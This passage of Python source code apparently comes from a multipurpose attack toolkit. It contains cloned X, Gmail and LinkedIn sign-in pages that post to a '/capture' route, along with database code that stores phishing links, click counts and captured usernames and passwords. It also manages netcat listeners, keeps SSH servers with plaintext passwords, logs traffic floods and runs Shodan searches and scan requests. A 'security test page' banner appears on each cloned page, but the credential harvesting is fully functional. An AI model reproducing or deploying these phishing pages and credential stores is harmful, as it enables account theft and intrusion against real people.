        button { width: 100%; padding: 12px; background-color: #1d9bf0; color: white; border: none; border-radius: 9999px; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 20px; }
        .links { display: flex; justify-content: space-between; margin-top: 20px; }
        .links a { color: #1d9bf0; text-decoration: none; font-size: 14px; }
        .warning { margin-top: 20px; padding: 12px; background-color: #1a1a1a; border: 1px solid #2f3336; border-radius: 8px; color: #e7e9ea; text-align: center; font-size: 14px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo"><h1>𝕏</h1><h2>Sign in to X</h2></div>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="username" placeholder="Phone, email, or username" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <button type="submit">Next</button>
                <div class="links"><a href="#">Forgot password?</a><a href="#">Sign up with X</a></div>
            </form>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_gmail_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Gmail</title>
    <style>
        body { font-family: 'Google Sans', Roboto, Arial, sans-serif; background-color: #f0f4f9; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { max-width: 450px; width: 100%; padding: 20px; }
        .login-box { background-color: white; border-radius: 28px; padding: 48px 40px 36px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo h1 { color: #1a73e8; font-size: 24px; margin: 10px 0 0; }
        h2 { font-size: 24px; font-weight: 400; margin: 0 0 10px; }
        .form-group { margin-bottom: 20px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
        button { width: 100%; padding: 13px; background-color: #1a73e8; color: white; border: none; border-radius: 4px; font-weight: 500; font-size: 14px; cursor: pointer; margin-top: 20px; }
        .links { margin-top: 30px; text-align: center; }
        .links a { color: #1a73e8; text-decoration: none; font-size: 14px; margin: 0 10px; }
        .warning { margin-top: 30px; padding: 12px; background-color: #e8f0fe; border: 1px solid #d2e3fc; border-radius: 8px; color: #202124; text-align: center; font-size: 13px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo"><h1>Gmail</h1></div>
            <h2>Sign in</h2>
            <div class="subtitle">to continue to Gmail</div>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="email" placeholder="Email or phone" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <button type="submit">Next</button>
                <div class="links"><a href="#">Create account</a><a href="#">Forgot email?</a></div>
            </form>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_linkedin_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>LinkedIn Login</title>
    <style>
        body { font-family: -apple-system, system-ui, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', 'Fira Sans', Ubuntu, Oxygen, 'Oxygen Sans', Cantarell, 'Droid Sans', 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Lucida Grande', Helvetica, Arial, sans-serif; background-color: #f3f2f0; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { max-width: 400px; width: 100%; padding: 20px; }
        .login-box { background-color: white; border-radius: 8px; padding: 40px 32px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); }
        .logo { text-align: center; margin-bottom: 24px; }
        .logo h1 { color: #0a66c2; font-size: 32px; margin: 0; }
        h2 { font-size: 24px; font-weight: 600; margin: 0 0 8px; }
        .form-group { margin-bottom: 16px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 14px; border: 1px solid #666666; border-radius: 4px; font-size: 14px; box-sizing: border-box; }
        button { width: 100%; padding: 14px; background-color: #0a66c2; color: white; border: none; border-radius: 28px; font-weight: 600; font-size: 16px; cursor: pointer; margin-top: 8px; }
        .forgot-password { text-align: center; margin-top: 16px; }
        .signup-link { text-align: center; margin-top: 20px; padding-top: 20px; border-top: 1px solid #e0e0e0; }
        .warning { margin-top: 24px; padding: 12px; background-color: #fff3cd; border: 1px solid #ffeeba; border-radius: 4px; color: #856404; text-align: center; font-size: 13px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo"><h1>LinkedIn</h1></div>
            <h2>Sign in</h2>
            <div class="subtitle">Stay updated on your professional world</div>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="email" placeholder="Email or phone number" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <button type="submit">Sign in</button>
                <div class="forgot-password"><a href="#">Forgot password?</a></div>
            </form>
            <div class="signup-link">New to LinkedIn? <a href="#">Join now</a></div>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    # ==================== Database Methods ====================
    
    def get_active_workspace(self) -> Optional[Dict]:
        """Get active workspace"""
        try:
            self.cursor.execute('SELECT * FROM workspaces WHERE active = 1')
            row = self.cursor.fetchone()
            return dict(row) if row else None
        except Exception as e:
            logger.error(f"Failed to get active workspace: {e}")
            return None
    
    def log_command(self, command: str, source: str = "local", success: bool = True,
                   output: str = "", execution_time: float = 0.0):
        """Log command execution"""
        try:
            self.cursor.execute('''
                INSERT INTO command_history (command, source, success, output, execution_time)
                VALUES (?, ?, ?, ?, ?)
            ''', (command, source, success, output[:5000], execution_time))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log command: {e}")
    
    def log_time_command(self, command: str, user: str = "system", result: str = ""):
        """Log time/date command"""
        try:
            self.cursor.execute('''
                INSERT INTO time_history (command, user, result, timestamp)
                VALUES (?, ?, ?, CURRENT_TIMESTAMP)
            ''', (command, user, result[:500]))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log time command: {e}")
    
    def log_threat(self, alert: ThreatAlert):
        """Log threat alert"""
        try:
            self.cursor.execute('''
                INSERT INTO threats (timestamp, threat_type, source_ip, severity, description, action_taken)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (alert.timestamp, alert.threat_type, alert.source_ip,
                  alert.severity, alert.description, alert.action_taken))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log threat: {e}")
    
    def add_shodan_query(self, query: str, total_results: int, output_file: str = None, facets: str = None) -> Optional[int]:
        """Add Shodan query to database"""
        try:
            self.cursor.execute('''
                INSERT INTO shodan_queries (query, total_results, output_file, facets)
                VALUES (?, ?, ?, ?)
            ''', (query, total_results, output_file, facets))
            self.conn.commit()
            return self.cursor.lastrowid
        except Exception as e:
            logger.error(f"Failed to add Shodan query: {e}")
            return None
    
    def add_shodan_result(self, query_id: int, ip: str, port: int, org: str = None, isp: str = None,
                         country: str = None, city: str = None, hostnames: str = None, os: str = None):
        """Add Shodan result to database"""
        try:
            self.cursor.execute('''
                INSERT INTO shodan_results (query_id, ip, port, org, isp, country, city, hostnames, os)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (query_id, ip, port, org, isp, country, city, hostnames, os))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to add Shodan result: {e}")
    
    def get_shodan_queries(self, limit: int = 10) -> List[Dict]:
        """Get recent Shodan queries"""
        try:
            self.cursor.execute('''
                SELECT * FROM shodan_queries ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get Shodan queries: {e}")
            return []
    
    def get_shodan_results(self, query_id: int = None, limit: int = 50) -> List[Dict]:
        """Get Shodan results"""
        try:
            if query_id:
                self.cursor.execute('''
                    SELECT * FROM shodan_results WHERE query_id = ? ORDER BY timestamp DESC
                ''', (query_id,))
            else:
                self.cursor.execute('''
                    SELECT * FROM shodan_results ORDER BY timestamp DESC LIMIT ?
                ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get Shodan results: {e}")
            return []
    
    def add_netcat_listener(self, listener_id: str, port: int, mode: str, pid: int = None) -> bool:
        """Add netcat listener to database"""
        try:
            self.cursor.execute('''
                INSERT INTO netcat_listeners (id, port, mode, pid, status)
                VALUES (?, ?, ?, ?, 'running')
            ''', (listener_id, port, mode, pid))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to add netcat listener: {e}")
            return False
    
    def update_netcat_listener(self, listener_id: str, connections: int = None, data_received: int = None, status: str = None):
        """Update netcat listener"""
        try:
            updates = []
            params = []
            if connections is not None:
                updates.append("connections = connections + ?")
                params.append(connections)
            if data_received is not None:
                updates.append("data_received = data_received + ?")
                params.append(data_received)
            if status is not None:
                updates.append("status = ?")
                params.append(status)
                if status == 'stopped':
                    updates.append("end_time = CURRENT_TIMESTAMP")
            
            if updates:
                query = f"UPDATE netcat_listeners SET {', '.join(updates)} WHERE id = ?"
                params.append(listener_id)
                self.cursor.execute(query, params)
                self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to update netcat listener: {e}")
    
    def get_netcat_listeners(self, active_only: bool = True) -> List[Dict]:
        """Get netcat listeners"""
        try:
            if active_only:
                self.cursor.execute('SELECT * FROM netcat_listeners WHERE status = "running" ORDER BY start_time DESC')
            else:
                self.cursor.execute('SELECT * FROM netcat_listeners ORDER BY start_time DESC')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get netcat listeners: {e}")
            return []
    
    def add_netcat_connection(self, listener_id: str, remote_ip: str, remote_port: int, data_size: int = 0, command: str = None):
        """Add netcat connection to database"""
        try:
            self.cursor.execute('''
                INSERT INTO netcat_connections (listener_id, remote_ip, remote_port, data_size, command)
                VALUES (?, ?, ?, ?, ?)
            ''', (listener_id, remote_ip, remote_port, data_size, command))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to add netcat connection: {e}")
    
    def add_ssh_server(self, server: SSHServer) -> bool:
        """Add SSH server to database"""
        try:
            self.cursor.execute('''
                INSERT OR REPLACE INTO ssh_servers 
                (id, name, host, port, username, password, key_file, use_key, timeout, notes, created_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (server.id, server.name, server.host, server.port, server.username,
                  server.password, server.key_file, server.use_key, server.timeout,
                  server.notes, server.created_at or datetime.datetime.now().isoformat()))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to add SSH server: {e}")
            return False
    
    def get_ssh_servers(self) -> List[Dict]:
        """Get all SSH servers"""
        try:
            self.cursor.execute('SELECT * FROM ssh_servers ORDER BY name')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get SSH servers: {e}")
            return []
    
    def get_ssh_server(self, server_id: str) -> Optional[Dict]:
        """Get SSH server by ID"""
        try:
            self.cursor.execute('SELECT * FROM ssh_servers WHERE id = ?', (server_id,))
            row = self.cursor.fetchone()
            return dict(row) if row else None
        except Exception as e:
            logger.error(f"Failed to get SSH server: {e}")
            return None
    
    def delete_ssh_server(self, server_id: str) -> bool:
        """Delete SSH server"""
        try:
            self.cursor.execute('DELETE FROM ssh_servers WHERE id = ?', (server_id,))
            self.conn.commit()
            return self.cursor.rowcount > 0
        except Exception as e:
            logger.error(f"Failed to delete SSH server: {e}")
            return False
    
    def update_ssh_server_status(self, server_id: str, status: str):
        """Update SSH server status"""
        try:
            self.cursor.execute('''
                UPDATE ssh_servers 
                SET status = ?, last_used = CURRENT_TIMESTAMP
                WHERE id = ?
            ''', (status, server_id))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to update SSH server status: {e}")
    
    def log_ssh_command(self, server_id: str, server_name: str, command: str,
                       success: bool, output: str, error: str = None,
                       execution_time: float = 0.0, executed_by: str = "system"):
        """Log SSH command execution"""
        try:
            self.cursor.execute('''
                INSERT INTO ssh_commands 
                (server_id, server_name, command, success, output, error, execution_time, executed_by)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            ''', (server_id, server_name, command, success, output[:5000], 
                  error[:500] if error else None, execution_time, executed_by))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log SSH command: {e}")
    
    def start_ssh_session(self, server_id: str) -> Optional[int]:
        """Start SSH session tracking"""
        try:
            self.cursor.execute('''
                INSERT INTO ssh_sessions (server_id)
                VALUES (?)
            ''', (server_id,))
            self.conn.commit()
            return self.cursor.lastrowid
        except Exception as e:
            logger.error(f"Failed to start SSH session: {e}")
            return None
    
    def end_ssh_session(self, session_id: int, commands_count: int):
        """End SSH session"""
        try:
            self.cursor.execute('''
                UPDATE ssh_sessions 
                SET end_time = CURRENT_TIMESTAMP, status = 'ended', commands_count = ?
                WHERE id = ?
            ''', (commands_count, session_id))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to end SSH session: {e}")
    
    def get_ssh_command_history(self, server_id: str = None, limit: int = 50) -> List[Dict]:
        """Get SSH command history"""
        try:
            if server_id:
                self.cursor.execute('''
                    SELECT * FROM ssh_commands 
                    WHERE server_id = ? 
                    ORDER BY timestamp DESC LIMIT ?
                ''', (server_id, limit))
            else:
                self.cursor.execute('''
                    SELECT * FROM ssh_commands 
                    ORDER BY timestamp DESC LIMIT ?
                ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get SSH command history: {e}")
            return []
    
    def log_traffic(self, traffic: TrafficGenerator, executed_by: str = "system"):
        """Log traffic generation"""
        try:
            self.cursor.execute('''
                INSERT INTO traffic_logs 
                (traffic_type, target_ip, target_port, duration, packets_sent, bytes_sent, status, executed_by, error)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (traffic.traffic_type, traffic.target_ip, traffic.target_port,
                  traffic.duration, traffic.packets_sent, traffic.bytes_sent,
                  traffic.status, executed_by, traffic.error))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log traffic: {e}")
    
    def log_nikto_scan(self, nikto_result: NiktoResult):
        """Log Nikto scan results"""
        try:
            vulnerabilities_json = json.dumps(nikto_result.vulnerabilities) if nikto_result.vulnerabilities else "[]"
            self.cursor.execute('''
                INSERT INTO nikto_scans (target, vulnerabilities, output_file, scan_time, success, timestamp)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (nikto_result.target, vulnerabilities_json, nikto_result.output_file,
                  nikto_result.scan_time, nikto_result.success, nikto_result.timestamp))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log Nikto scan: {e}")
    
    def save_phishing_link(self, link: PhishingLink) -> bool:
        """Save phishing link to database"""
        try:
            self.cursor.execute('''
                INSERT INTO phishing_links (id, platform, original_url, phishing_url, template, created_at, clicks, qr_code_path)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            ''', (link.id, link.platform, link.original_url, link.phishing_url, link.template,
                  link.created_at, link.clicks, None))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to save phishing link: {e}")
            return False
    
    def get_phishing_links(self, active_only: bool = True) -> List[Dict]:
        """Get phishing links"""
        try:
            if active_only:
                self.cursor.execute('''
                    SELECT * FROM phishing_links WHERE active = 1 ORDER BY created_at DESC
                ''')
            else:
                self.cursor.execute('''
                    SELECT * FROM phishing_links ORDER BY created_at DESC
                ''')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get phishing links: {e}")
            return []
    
    def get_phishing_link(self, link_id: str) -> Optional[Dict]:
        """Get phishing link by ID"""
        try:
            self.cursor.execute('''
                SELECT * FROM phishing_links WHERE id = ?
            ''', (link_id,))
            row = self.cursor.fetchone()
            return dict(row) if row else None
        except Exception as e:
            logger.error(f"Failed to get phishing link: {e}")
            return None
    
    def update_phishing_link_clicks(self, link_id: str):
        """Update click count for phishing link"""
        try:
            self.cursor.execute('''
                UPDATE phishing_links SET clicks = clicks + 1 WHERE id = ?
            ''', (link_id,))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to update clicks: {e}")
    
    def save_captured_credential(self, link_id: str, username: str, password: str,
                                 ip_address: str, user_agent: str, additional_data: str = ""):
        """Save captured credentials"""
        try:
            self.cursor.execute('''
                INSERT INTO captured_credentials (phishing_link_id, username, password, ip_address, user_agent, additional_data)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (link_id, username, password, ip_address, user_agent, additional_data))
            self.conn.commit()
            logger.info(f"Credentials captured for link {link_id} from {ip_address}")
            return True
        except Exception as e:
            logger.error(f"Failed to save captured credentials: {e}")
            return False
    
    def get_captured_credentials(self, link_id: Optional[str] = None) -> List[Dict]:
        """Get captured credentials"""
        try:
            if link_id:
                self.cursor.execute('''
                    SELECT * FROM captured_credentials WHERE phishing_link_id = ? ORDER BY timestamp DESC
                ''', (link_id,))
            else:
                self.cursor.execute('''
                    SELECT * FROM captured_credentials ORDER BY timestamp DESC
                ''')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get captured credentials: {e}")
            return []
    
    def add_managed_ip(self, ip: str, added_by: str = "system", notes: str = "") -> bool:
        """Add IP to management"""
        try:
            ipaddress.ip_address(ip)
            self.cursor.execute('''
                INSERT OR IGNORE INTO managed_ips (ip_address, added_by, notes, added_date)
                VALUES (?, ?, ?, CURRENT_TIMESTAMP)
            ''', (ip, added_by, notes))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to add managed IP: {e}")
            return False
    
    def remove_managed_ip(self, ip: str) -> bool:
        """Remove IP from management"""
        try:
            self.cursor.execute('''
                DELETE FROM managed_ips WHERE ip_address = ?
            ''', (ip,))
            self.conn.commit()
            return self.cursor.rowcount > 0
        except Exception as e:
            logger.error(f"Failed to remove managed IP: {e}")
            return False
    
    def block_ip(self, ip: str, reason: str, executed_by: str = "system") -> bool:
        """Mark IP as blocked"""
        try:
            self.cursor.execute('''
                UPDATE managed_ips 
                SET is_blocked = 1, block_reason = ?, blocked_date = CURRENT_TIMESTAMP
                WHERE ip_address = ?
            ''', (reason, ip))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to block IP: {e}")
            return False
    
    def unblock_ip(self, ip: str, executed_by: str = "system") -> bool:
        """Unblock IP"""
        try:
            self.cursor.execute('''
                UPDATE managed_ips 
                SET is_blocked = 0, block_reason = NULL, blocked_date = NULL
                WHERE ip_address = ?
            ''', (ip,))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to unblock IP: {e}")
            return False
    
    def get_managed_ips(self, include_blocked: bool = True) -> List[Dict]:
        """Get managed IPs"""
        try:
            if include_blocked:
                self.cursor.execute('''
                    SELECT * FROM managed_ips ORDER BY added_date DESC
                ''')
            else:
                self.cursor.execute('''
                    SELECT * FROM managed_ips WHERE is_blocked = 0 ORDER BY added_date DESC
                ''')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get managed IPs: {e}")
            return []
    
    def get_ip_info(self, ip: str) -> Optional[Dict]:
        """Get information about a specific IP"""
        try:
            self.cursor.execute('''
                SELECT * FROM managed_ips WHERE ip_address = ?
            ''', (ip,))
            row = self.cursor.fetchone()
            return dict(row) if row else None
        except Exception as e:
            logger.error(f"Failed to get IP info: {e}")
            return None
    
    def get_recent_threats(self, limit: int = 10) -> List[Dict]:
        """Get recent threats"""
        try:
            self.cursor.execute('''
                SELECT * FROM threats ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get threats: {e}")
            return []
    
    def get_nikto_scans(self, limit: int = 10) -> List[Dict]:
        """Get recent Nikto scans"""
        try:
            self.cursor.execute('''
                SELECT * FROM nikto_scans ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get Nikto scans: {e}")
            return []
    
    def get_command_history(self, limit: int = 20) -> List[Dict]:
        """Get command history"""
        try:
            self.cursor.execute('''
                SELECT command, source, timestamp, success FROM command_history 
                ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get command history: {e}")
            return []
    
    def get_time_history(self, limit: int = 20) -> List[Dict]:
        """Get time/date command history"""
        try:
            self.cursor.execute('''
                SELECT command, user, result, timestamp FROM time_history 
                ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get time history: {e}")
            return []
    
    def create_session(self, user_name: str = None) -> str:
        """Create new user session"""
        try:
            session_id = str(uuid.uuid4())[:8]
            self.cursor.execute('''
                INSERT INTO user_sessions (session_id, user_name)
                VALUES (?, ?)
            ''', (session_id, user_name))
            self.conn.commit()
            return session_id
        except Exception as e:
            logger.error(f"Failed to create session: {e}")
            return None
    
    def update_session_activity(self, session_id: str):
        """Update session activity"""
        try:
            self.cursor.execute('''
                UPDATE user_sessions 
                SET last_activity = CURRENT_TIMESTAMP, 
                    commands_count = commands_count + 1
                WHERE session_id = ? AND active = 1
            ''', (session_id,))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to update session: {e}")
    
    def end_session(self, session_id: str):
        """End user session"""
        try:
            self.cursor.execute('''
                UPDATE user_sessions 
                SET active = 0, last_activity = CURRENT_TIMESTAMP
                WHERE session_id = ?
            ''', (session_id,))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to end session: {e}")
    
    def get_statistics(self) -> Dict:
        """Get database statistics"""
        stats = {}
        try:
            self.cursor.execute('SELECT COUNT(*) FROM threats')
            stats['total_threats'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM command_history')
            stats['total_commands'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM time_history')
            stats['total_time_commands'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM nikto_scans')
            stats['total_nikto_scans'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM ssh_servers')
            stats['total_ssh_servers'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM ssh_commands')
            stats['total_ssh_commands'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM managed_ips')
            stats['total_managed_ips'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM managed_ips WHERE is_blocked = 1')
            stats['total_blocked_ips'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM traffic_logs')
            stats['total_traffic_tests'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM phishing_links WHERE active = 1')
            stats['active_phishing_links'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM captured_credentials')
            stats['captured_credentials'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM user_sessions WHERE active = 1')
            stats['active_sessions'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM netcat_listeners')
            stats['active_netcat_listeners'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM shodan_queries')
            stats['total_shodan_queries'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM shodan_results')
            stats['total_shodan_results'] = self.cursor.fetchone()[0]
        except Exception as e:
            logger.error(f"Failed to get statistics: {e}")
        return stats
    
    def close(self):
        """Close database connection"""
        try:
            if self.conn:
                self.conn.close()
        except Exception as e:
            logger.error(f"Error closing database: {e}")

# =====================
# SHODAN INTEGRATION
# =====================
class ShodanIntegration:
    """Shodan API integration for internet-wide device search"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.api = None
        self.api_key = None
        self.enabled = False
        self.load_config()
    
    def load_config(self):
        """Load Shodan configuration"""
        config = ConfigManager.load_shodan_config()
        self.api_key = config.get('api_key', '')
        self.enabled = config.get('enabled', False)
        
        if self.enabled and self.api_key and SHODAN_AVAILABLE:
            try:
                self.api = shodan.Shodan(self.api_key)
            except Exception as e:
                logger.error(f"Failed to initialize Shodan API: {e}")
    
    def set_api_key(self, api_key: str, enabled: bool = True) -> bool:
        """Set Shodan API key"""
        if ConfigManager.save_shodan_config(api_key, enabled):
            self.api_key = api_key
            self.enabled = enabled
            if enabled and SHODAN_AVAILABLE:
                try:
                    self.api = shodan.Shodan(api_key)
                except Exception as e:
                    logger.error(f"Failed to initialize Shodan API: {e}")
            return True
        return False
    
    def search(self, query: str, facets: str = None, page: int = 1, limit: int = 100) -> ShodanResult:
        """Search Shodan for devices"""
        if not self.enabled or not self.api:
            return ShodanResult(
                query=query,
                timestamp=datetime.datetime.now().isoformat(),
                total_results=0,
                results=[],
                error="Shodan not configured or API key invalid"
            )
        
        try:
            results = self.api.search(query, page=page, limit=limit, facets=facets)
            
            output_file = None
            if ConfigManager.load_config().get('shodan', {}).get('save_results', True):
                timestamp = int(time.time())
                filename = f"shodan_{query.replace(' ', '_')}_{timestamp}.json"
                output_file = os.path.join(SHODAN_RESULTS_DIR, filename)
                
                with open(output_file, 'w') as f:
                    json.dump(results, f, indent=2)
            
            facets_str = json.dumps(results.get('facets', {})) if results.get('facets') else None
            query_id = self.db.add_shodan_query(query, results['total'], output_file, facets_str)
            
            processed_results = []
            for match in results.get('matches', []):
                hostnames = ','.join(match.get('hostnames', [])) if match.get('hostnames') else None
                os_info = match.get('os')
                
                processed_result = {
                    'ip': match.get('ip_str'),
                    'port': match.get('port'),
                    'org': match.get('org'),
                    'isp': match.get('isp'),
                    'country': match.get('location', {}).get('country_name'),
                    'city': match.get('location', {}).get('city'),
                    'hostnames': hostnames,
                    'os': os_info,
                    'data': match.get('data', '')[:200]
                }
                processed_results.append(processed_result)
                
                if query_id:
                    self.db.add_shodan_result(
                        query_id=query_id,
                        ip=match.get('ip_str'),
                        port=match.get('port'),
                        org=match.get('org'),
                        isp=match.get('isp'),
                        country=match.get('location', {}).get('country_name'),
                        city=match.get('location', {}).get('city'),
                        hostnames=hostnames,
                        os=os_info
                    )
            
            return ShodanResult(
                query=query,
                timestamp=datetime.datetime.now().isoformat(),
                total_results=results['total'],
                results=processed_results[:50],
                facets=results.get('facets'),
                saved_file=output_file
            )
            
        except shodan.APIError as e:
            return ShodanResult(
                query=query,
                timestamp=datetime.datetime.now().isoformat(),
                total_results=0,
                results=[],
                error=f"Shodan API error: {e}"
            )
        except Exception as e:
            logger.error(f"Shodan search error: {e}")
            return ShodanResult(
                query=query,
                timestamp=datetime.datetime.now().isoformat(),
                total_results=0,
                results=[],
                error=str(e)
            )
    
    def host_info(self, ip: str) -> Dict[str, Any]:
        """Get information about a specific IP from Shodan"""
        if not self.enabled or not self.api:
            return {'success': False, 'error': 'Shodan not configured'}
        
        try:
            host = self.api.host(ip)
            return {
                'success': True,
                'ip': host.get('ip_str'),
                'org': host.get('org'),
                'isp': host.get('isp'),
                'country': host.get('country_name'),
                'city': host.get('city'),
                'os': host.get('os'),
                'ports': host.get('ports'),
                'hostnames': host.get('hostnames'),
                'data': host.get('data', [])[:5]
            }
        except shodan.APIError as e:
            return {'success': False, 'error': f"Shodan API error: {e}"}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def count(self, query: str, facets: str = None) -> Dict[str, Any]:
        """Get count of results for a query"""
        if not self.enabled or not self.api:
            return {'success': False, 'error': 'Shodan not configured'}
        
        try:
            count = self.api.count(query, facets=facets)
            return {
                'success': True,
                'total': count.get('total', 0),
                'facets': count.get('facets')
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def scan(self, ip: str, ports: List[int] = None) -> Dict[str, Any]:
        """Request Shodan to scan an IP"""
        if not self.enabled or not self.api:
            return {'success': False, 'error': 'Shodan not configured'}
        
        try:
            result = self.api.scan(ip)
            return {
                'success': True,
                'id': result.get('id'),
                'status': result.get('status'),
                'ports': ports or []
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def protocols(self) -> List[str]:
        """Get list of protocols that Shodan crawls"""
        if not self.enabled or not self.api:
            return []
        
        try:
            return self.api.protocols()
        except Exception as e:
            logger.error(f"Failed to get protocols: {e}")
            return []

# =====================
# NETCAT TOOLS
# =====================
class NetcatTools:
    """Netcat command execution and listener management"""
    
    def __init__(self, db: DatabaseManager, config: Dict = None):
        self.db = db
        self.config = config or {}
        self.active_listeners = {}
        self.listener_threads = {}
        self.stop_events = {}
        self.nc_available = shutil.which('nc') is not None or shutil.which('netcat') is not None
    
    def check_netcat(self) -> bool:
        """Check if netcat is available"""
        if self.nc_available:
            return True
        
        for name in ['nc', 'netcat', 'ncat']:
            if shutil.which(name):
                self.nc_available = True
                return True
        
        return False
    
    def get_netcat_path(self) -> str:
        """Get path to netcat executable"""
        for name in ['nc', 'netcat', 'ncat']:
            path = shutil.which(name)
            if path:
                return path
        return 'nc'
    
    def create_listener(self, port: int, mode: str = 'listen', options: Dict = None) -> Dict[str, Any]:
        """Create a netcat listener"""
        options = options or {}
        
        if not self.check_netcat():
            return {'success': False, 'error': 'Netcat not installed'}
        
        max_listeners = self.config.get('netcat', {}).get('max_listeners', 10)
        if len(self.active_listeners) >= max_listeners:
            return {'success': False, 'error': f'Max listeners reached ({max_listeners})'}
        
        try:
            listener_id = str(uuid.uuid4())[:8]
            stop_event = threading.Event()
            self.stop_events[listener_id] = stop_event
            
            nc_path = self.get_netcat_path()
            cmd = [nc_path]
            
            if mode == 'listen':
                cmd.extend(['-l', '-p', str(port)])
                if options.get('verbose'):
                    cmd.append('-v')
